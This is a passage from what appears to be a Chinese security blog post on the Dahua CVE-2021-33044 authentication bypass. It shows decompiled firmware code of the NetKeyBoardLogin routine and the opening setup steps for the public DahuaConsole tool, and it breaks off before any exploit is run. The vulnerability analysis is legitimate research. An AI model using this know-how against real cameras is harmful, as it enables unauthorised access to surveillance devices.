class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v30 = *(_BYTE *)++v28;</span><br><span class="line">      v29 += v30;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v28 != a1 + <span class="number">41</span> );</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">42</span>) = v29;</span><br><span class="line">    v31 = sub_F3512(a1, **(_DWORD **)(a1 + <span class="number">8</span>), a1 + <span class="number">20</span>, <span class="number">0</span>, <span class="number">500000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v31 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      return_f(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;%s(%d)--&quot;</span>, <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>, <span class="number">979</span>);</span><br><span class="line">      return_f(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;SBM Error(%d).\n&quot;</span>, v31);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v45);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v43);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v41);</span><br><span class="line">    v15 = (<span class="keyword">int</span> *)v39;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = sub_F3442(a1, **(_DWORD **)(a1 + <span class="number">8</span>));</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v50[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v50[<span class="number">2</span>];</span><br><span class="line">    v50[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    LOBYTE(v50[<span class="number">2</span>]) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v50, v7 + <span class="number">8</span>);</span><br><span class="line">    sub_F30D4(v8);</span><br><span class="line">    sub_5D774C(v49, <span class="number">0</span>);</span><br><span class="line">    v9 = sub_64324(&amp;v34);</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, _DWORD *))(*(_DWORD *)v9 + <span class="number">72</span>))(v9, v50, v49);</span><br><span class="line">    v10 = sub_5D88E0((<span class="keyword">int</span>)v49, (<span class="keyword">int</span>)<span class="string">&quot;Group&quot;</span>);</span><br><span class="line">    sub_5D7918(v38, v10);</span><br><span class="line">    v11 = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::compare(v38, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v38);</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = sub_64324(&amp;v34);</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v13 + <span class="number">60</span>))(v13, v50);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = sub_12FCE4(a1 + <span class="number">56</span>);</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v14 + <span class="number">32</span>))(v14);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_5D7EF2(v49, v12);</span><br><span class="line">    v15 = v50;</span><br><span class="line">LABEL_34:</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v15);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_39:</span><br><span class="line">  sub_64310(&amp;v34);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_14149E</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> *v15; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> *v16; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// t1</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+14h] [bp-16Ch] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v34; <span class="comment">// [sp+18h] [bp-168h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [sp+1Ch] [bp-164h]</span></span><br><span class="line">  <span class="keyword">void</span> *v36; <span class="comment">// [sp+20h] [bp-160h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [sp+24h] [bp-15Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v38[<span class="number">24</span>]; <span class="comment">// [sp+28h] [bp-158h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v39[<span class="number">2</span>]; <span class="comment">// [sp+40h] [bp-140h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [sp+48h] [bp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v41[<span class="number">2</span>]; <span class="comment">// [sp+58h] [bp-128h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [sp+60h] [bp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v43[<span class="number">2</span>]; <span class="comment">// [sp+70h] [bp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [sp+78h] [bp-108h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v45[<span class="number">2</span>]; <span class="comment">// [sp+88h] [bp-F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [sp+90h] [bp-F0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">24</span>]; <span class="comment">// [sp+A0h] [bp-E0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v48[<span class="number">24</span>]; <span class="comment">// [sp+B8h] [bp-C8h] BYREF</span></span><br><span class="line">  _DWORD v49[<span class="number">6</span>]; <span class="comment">// [sp+D0h] [bp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v50[<span class="number">32</span>]; <span class="comment">// [sp+E8h] [bp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v50[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="built_in">sub_4D68E4</span>(</span><br><span class="line">                       <span class="string">&quot;UserManager&quot;</span>,</span><br><span class="line">                       &amp;Dahua::Component::ClassID::local,</span><br><span class="line">                       &amp;Dahua::Component::ServerInfo::none,</span><br><span class="line">                       v50);</span><br><span class="line">  <span class="keyword">if</span> ( v2</span><br><span class="line">    &amp;&amp; (v3 = _dynamic_cast(</span><br><span class="line">               v2,</span><br><span class="line">               (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IFactoryUnknown,</span><br><span class="line">               (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Manager::IUserManager::IFactory,</span><br><span class="line">               <span class="number">0</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (*(<span class="built_in"><span class="keyword">int</span></span> (__fastcall **)(<span class="keyword">void</span> *))(*(_DWORD *)v3 + <span class="number">12</span>))(v3);</span><br><span class="line">    v5 = v50[<span class="number">0</span>];</span><br><span class="line">    v6 = (<span class="keyword">void</span> *)<span class="built_in">sub_4D7DF4</span>(v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      v6 = _dynamic_cast(</span><br><span class="line">             v6,</span><br><span class="line">             (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IUnknown,</span><br><span class="line">             (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Manager::IUserManager,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">    v34 = v6;</span><br><span class="line">    v35 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v34 = <span class="number">0</span>;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_4CB734</span>(</span><br><span class="line">      <span class="number">2</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d Failed to get user manager component!\n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">747</span>);</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">unsigned</span> __int8 *)(*(_DWORD *)(a1 + <span class="number">16</span>) + <span class="number">20</span>) != <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 + <span class="number">20</span>), <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">23</span>) = <span class="number">104</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">20</span>) = <span class="number">-104</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">35</span>) = <span class="number">-112</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">36</span>) = <span class="number">-1</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">37</span>) = <span class="number">-2</span>;</span><br><span class="line">    v39[<span class="number">0</span>] = &amp;v40;</span><br><span class="line">    v40 = <span class="number">0</span>;</span><br><span class="line">    v42 = <span class="number">0</span>;</span><br><span class="line">    v44 = <span class="number">0</span>;</span><br><span class="line">    v46 = <span class="number">0</span>;</span><br><span class="line">    v39[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v41[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v43[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v45[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v16 = *(<span class="keyword">int</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">    v41[<span class="number">0</span>] = &amp;v42;</span><br><span class="line">    v43[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v44;</span><br><span class="line">    v17 = *v16;</span><br><span class="line">    v45[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v46;</span><br><span class="line">    v18 = <span class="built_in">sub_F3442</span>(a1, v17);</span><br><span class="line">    v19 = v18;</span><br><span class="line">    <span class="keyword">if</span> ( v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v39, v18 + <span class="number">8</span>);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v47, v19 + <span class="number">32</span>);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v41, v47);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v47);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v48, v19 + <span class="number">84</span>);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v43, v48);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v48);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v49, v19 + <span class="number">108</span>);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v45, v49);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v49);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_4CB734</span>(</span><br><span class="line">      <span class="number">5</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d name = %s, password = %s \n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">918</span>,</span><br><span class="line">      v39[<span class="number">0</span>],</span><br><span class="line">      v41[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v50));</span><br><span class="line">    v50[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    v50[<span class="number">2</span>] = (<span class="keyword">int</span>)v39[<span class="number">0</span>];</span><br><span class="line">    v50[<span class="number">3</span>] = (<span class="keyword">int</span>)v41[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">HIWORD</span>(v50[<span class="number">5</span>]) = <span class="number">5000</span>;</span><br><span class="line">    v50[<span class="number">6</span>] = (<span class="keyword">int</span>)<span class="string">&quot;NetKeyBoard&quot;</span>;</span><br><span class="line">    v50[<span class="number">7</span>] = *(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">132596</span>;</span><br><span class="line">    v50[<span class="number">11</span>] = v43[<span class="number">0</span>];</span><br><span class="line">    v50[<span class="number">8</span>] = v45[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v33 = <span class="number">0</span>;</span><br><span class="line">      v20 = <span class="built_in">sub_141E80</span>(&amp;Dahua::Component::ClassID::local, &amp;Dahua::Component::ServerInfo::none, &amp;v33);</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        v21 = (*(<span class="built_in"><span class="keyword">int</span></span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v20 + <span class="number">12</span>))(v20, v50);</span><br><span class="line">        v22 = v33;</span><br><span class="line">        v23 = (<span class="keyword">void</span> *)<span class="built_in">sub_4D7DC4</span>(v21);</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          v23 = _dynamic_cast(</span><br><span class="line">                  v23,</span><br><span class="line">                  (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IUnknown,</span><br><span class="line">                  (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IClient,</span><br><span class="line">                  <span class="number">0</span>);</span><br><span class="line">        v36 = v23;</span><br><span class="line">        v37 = v22;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v36 = <span class="number">0</span>;</span><br><span class="line">        v37 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_141DE8</span>(a1 + <span class="number">56</span>, &amp;v36);</span><br><span class="line">      <span class="built_in">sub_F30C0</span>(&amp;v36);</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a1 + <span class="number">56</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = <span class="built_in">sub_12FCE4</span>(a1 + <span class="number">56</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (*(<span class="built_in"><span class="keyword">int</span></span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v25 + <span class="number">24</span>))(v25) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = <span class="built_in">sub_12FCE4</span>(a1 + <span class="number">56</span>);</span><br><span class="line">        v24 = (*(<span class="built_in"><span class="keyword">int</span></span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v26 + <span class="number">28</span>))(v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v24 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_4CB734</span>(</span><br><span class="line">      <span class="number">5</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d loginSuccess = %d \n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">950</span>,</span><br><span class="line">      v24);</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(a1 + <span class="number">38</span>) = <span class="number">1</span>;</span><br><span class="line">      v27 = *(_BYTE *)(*(_DWORD *)(a1 + <span class="number">16</span>) + <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4CB734</span>(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;CmdsNetKeyBoard::NetKeyBoardLogin&gt;&gt;&gt;&gt;&gt;login user failed\n&quot;</span>);</span><br><span class="line">      *(_BYTE *)(a1 + <span class="number">38</span>) = <span class="number">0</span>;</span><br><span class="line">      v27 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">40</span>) = v27;</span><br><span class="line">    v28 = a1 + <span class="number">34</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v30 = *(_BYTE *)++v28;</span><br><span class="line">      v29 += v30;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v28 != a1 + <span class="number">41</span> );</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">42</span>) = v29;</span><br><span class="line">    v31 = <span class="built_in">sub_F3512</span>(a1, **(_DWORD **)(a1 + <span class="number">8</span>), a1 + <span class="number">20</span>, <span class="number">0</span>, <span class="number">500000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v31 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4CB734</span>(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;%s(%d)--&quot;</span>, <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>, <span class="number">979</span>);</span><br><span class="line">      <span class="built_in">sub_4CB734</span>(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;SBM Error(%d).\n&quot;</span>, v31);</span><br><span class="line">    &#125;</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v45);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v43);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v41);</span><br><span class="line">    v15 = (<span class="keyword">int</span> *)v39;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="built_in">sub_F3442</span>(a1, **(_DWORD **)(a1 + <span class="number">8</span>));</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v50[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v50[<span class="number">2</span>];</span><br><span class="line">    v50[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v50[<span class="number">2</span>]) = <span class="number">0</span>;</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v50, v7 + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">sub_F30D4</span>(v8);</span><br><span class="line">    <span class="built_in">sub_5D774C</span>(v49, <span class="number">0</span>);</span><br><span class="line">    v9 = <span class="built_in">sub_64324</span>(&amp;v34);</span><br><span class="line">    (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, _DWORD *))(*(_DWORD *)v9 + <span class="number">72</span>))(v9, v50, v49);</span><br><span class="line">    v10 = <span class="built_in">sub_5D88E0</span>((<span class="keyword">int</span>)v49, (<span class="keyword">int</span>)<span class="string">&quot;Group&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_5D7918</span>(v38, v10);</span><br><span class="line">    v11 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">compare</span>(v38, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v38);</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="built_in">sub_64324</span>(&amp;v34);</span><br><span class="line">      (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v13 + <span class="number">60</span>))(v13, v50);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="built_in">sub_12FCE4</span>(a1 + <span class="number">56</span>);</span><br><span class="line">      (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v14 + <span class="number">32</span>))(v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_5D7EF2</span>(v49, v12);</span><br><span class="line">    v15 = v50;</span><br><span class="line">LABEL_34:</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v15);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_39:</span><br><span class="line">  <span class="built_in">sub_64310</span>(&amp;v34);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>下载DahuaConsole</p>
<p><code>git clone https://github.com/mcw0/Dahua    Console.git</code></p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/tv9LaVZHJeqgSjA-20230520104706738.png" alt="image-20211014115215894"></p>
<p>安装DahuaConsole</p>
<p><code>pip3 install -r .\requirements.txt</code></p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/9RY4PVZkz8b5lGg-20230520104706804.png" alt="image-20211014115241252"></p>
]]></content>
      <categories>
        <category>IoT安全</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>测信道攻击——Hamming Weight Swings</title>
